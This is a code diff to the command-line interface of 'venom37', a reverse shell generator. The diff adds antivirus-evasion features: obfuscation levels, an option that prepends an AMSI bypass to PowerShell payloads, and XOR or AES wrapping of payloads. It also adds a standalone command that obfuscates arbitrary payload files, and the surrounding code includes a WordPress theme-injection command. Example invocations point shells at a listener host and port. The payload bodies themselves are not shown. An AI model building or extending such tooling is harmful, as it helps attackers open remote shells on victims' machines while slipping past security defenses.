@@ -1,4 +1,4 @@
-"""CLI for venom37 — reverse shell generator."""
+"""CLI for venom37 -- reverse shell generator."""
 from __future__ import annotations
 
 import asyncio
@@ -10,7 +10,7 @@ import click
 
 @click.group("venom")
 def venom_cli():
-    """venom37 — Reverse shell generator.
+    """venom37 -- Reverse shell generator.
 
     Generate reverse shells in multiple languages with encoding options.
     Includes listener commands and shell stabilization instructions.
@@ -32,6 +32,11 @@ def list_shells(human):
             click.echo(f"    {'':20s} {t['description']}")
             click.echo(f"    {'':20s} Requires: {t['requires']}")
             click.echo()
+        click.echo("  Obfuscation Options (for gen command):")
+        click.echo("    --obfuscate / -o LEVEL   Apply obfuscation (1-3)")
+        click.echo("    --amsi                   Prepend AMSI bypass (PowerShell)")
+        click.echo("    --encrypt TYPE           Wrap in encryption (xor, aes)")
+        click.echo()
     else:
         click.echo(json.dumps(types, indent=2))
 
@@ -46,15 +51,21 @@ def list_shells(human):
 @click.option("--human", is_flag=True, help="Human-readable output")
 @click.option("--explain", is_flag=True, help="Explain what the shell does")
 @click.option("--with-listener", is_flag=True, help="Include listener command in output")
-def gen(shell_type, lhost, lport, encode, listener, variant, human, explain, with_listener):
+@click.option("--obfuscate", "-o", default=0, type=click.IntRange(0, 3), help="Obfuscation level (1-3)")
+@click.option("--amsi", is_flag=True, help="Prepend AMSI bypass (PowerShell only)")
+@click.option("--encrypt", default=None, type=click.Choice(["xor", "aes"]), help="Wrap payload in encryption")
+def gen(shell_type, lhost, lport, encode, listener, variant, human, explain, with_listener, obfuscate, amsi, encrypt):
     """Generate a reverse shell payload.
 
     Examples:
       venom37 gen bash 10.0.0.1 4444
       venom37 gen php 10.0.0.1 4444 --encode base64
-      venom37 gen bash 10.0.0.1 4444 --with-listener --human
+      venom37 gen powershell 10.0.0.1 4444 --obfuscate 2
+      venom37 gen powershell 10.0.0.1 4444 --amsi --encrypt xor
+      venom37 gen python 10.0.0.1 4444 --encrypt xor
     """
     from venom37.engine import Venom
+    from venom37.obfuscate import Obfuscator
 
     try:
         shell = Venom.generate(shell_type, lhost, lport, encode=encode,
@@ -67,10 +78,105 @@ def gen(shell_type, lhost, lport, encode, listener, variant, human, explain, wit
         click.echo(shell.explanation)
         return
 
+    code = shell.code
+    is_ps = shell_type.startswith("powershell")
+    is_py = shell_type.startswith("python")
+
+    # Apply obfuscation
+    if obfuscate > 0:
+        if is_ps:
+            code = Obfuscator.obfuscate_powershell(code, level=obfuscate)
+        elif is_py:
+            code = Obfuscator.obfuscate_python(code, level=obfuscate)
+        else:
+            click.echo(f"Warning: obfuscation not fully supported for {shell_type}, applying basic transforms", err=True)
+
+    # AMSI bypass (PowerShell only)
+    if amsi:
+        if is_ps:
+            bypass = Obfuscator.amsi_bypass(randomize=True)
+            code = bypass + "\n\n" + code
+        else:
+            click.echo("Warning: --amsi only applies to PowerShell payloads", err=True)
+
+    # Encryption wrapping
+    if encrypt:
+        if encrypt == "xor":
+            if is_ps:
+                code = Obfuscator.wrap_xor_powershell(code)
+            elif is_py:
+                code = Obfuscator.wrap_xor_python(code)
+            else:
+                click.echo(f"Warning: XOR wrapping not supported for {shell_type}", err=True)
+        elif encrypt == "aes":
+            if is_ps:
+                code = Obfuscator.wrap_aes_powershell(code)
+            else:
+                click.echo(f"Warning: AES wrapping currently only supports PowerShell", err=True)
+
+    shell.code = code
+
     if human or with_listener:
         click.echo(shell.to_human())
     else:
         click.echo(shell.to_json())
+
+
+@venom_cli.command("obfuscate")
+@click.argument("input_file", type=click.Path(exists=True), required=False)
+@click.option("--lang", "-L", default="powershell", type=click.Choice(["powershell", "python"]), help="Language")
+@click.option("--level", "-l", default=2, type=click.IntRange(1, 3), help="Obfuscation level (1-3)")
+@click.option("--amsi", is_flag=True, help="Prepend AMSI bypass")
+@click.option("--encrypt", default=None, type=click.Choice(["xor", "aes"]), help="Wrap in encryption")
+@click.option("--stdin", "use_stdin", is_flag=True, help="Read from stdin")
+@click.option("--human", is_flag=True, help="Human-readable output")
+def obfuscate_cmd(input_file, lang, level, amsi, encrypt, use_stdin, human):
+    """Obfuscate a payload file or stdin.
+
+    Examples:
+      venom37 obfuscate payload.ps1 --level 3
+      echo 'IEX(payload)' | venom37 obfuscate --stdin --lang powershell
+      venom37 obfuscate script.py --lang python --encrypt xor
+    """
+    from venom37.obfuscate import Obfuscator
+
+    if use_stdin or input_file is None:
+        code = sys.stdin.read()
+    else:
+        with open(input_file) as f:
+            code = f.read()
+
+    if not code.strip():
+        click.echo("Error: empty input", err=True)
+        sys.exit(1)
+
+    if lang == "powershell":
+        code = Obfuscator.obfuscate_powershell(code, level=level)
+    elif lang == "python":
+        code = Obfuscator.obfuscate_python(code, level=level)
+
+    if amsi and lang == "powershell":
+        bypass = Obfuscator.amsi_bypass(randomize=True)
+        code = bypass + "\n\n" + code
+
+    if encrypt == "xor":
+        if lang == "powershell":
+            code = Obfuscator.wrap_xor_powershell(code)
+        elif lang == "python":
+            code = Obfuscator.wrap_xor_python(code)
+    elif encrypt == "aes":
+        if lang == "powershell":
+            code = Obfuscator.wrap_aes_powershell(code)
+
+    if human:
+        click.echo("\n  Obfuscated payload:")
+        click.echo("  " + "=" * 60)
+        for line in code.split("\n"):
+            click.echo("  " + line)
+        click.echo("  " + "=" * 60)
+        click.echo()
+    else:
+        click.echo(code)
 
 
 @venom_cli.command("wp-inject")
@@ -113,8 +219,7 @@ def wp_inject(target, user, password, lhost, lport, theme, human, explain):
     sys.exit(0 if result.get("success") else 1)
 
 
-# Also allow direct invocation: venom37 bash 10.0.0.1 4444
-# by making 'gen' the default command behavior
+# Shortcut commands
 @venom_cli.command("bash", hidden=True)
 @click.argument("lhost")
 @click.argument("lport", type=int, default=4444)
